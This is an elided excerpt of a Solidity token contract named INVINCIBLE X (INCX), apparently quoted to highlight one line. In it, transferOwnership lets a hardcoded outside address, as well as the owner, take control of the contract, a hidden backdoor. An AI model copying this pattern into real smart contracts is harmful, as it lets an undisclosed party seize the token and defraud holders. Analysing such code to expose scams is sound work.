...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x69f19ACc63079054Cebb38C382503f697a766C01));
...
contract INVINCIBLEX is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "INCX";
  string private _name = "INVINCIBLE X";
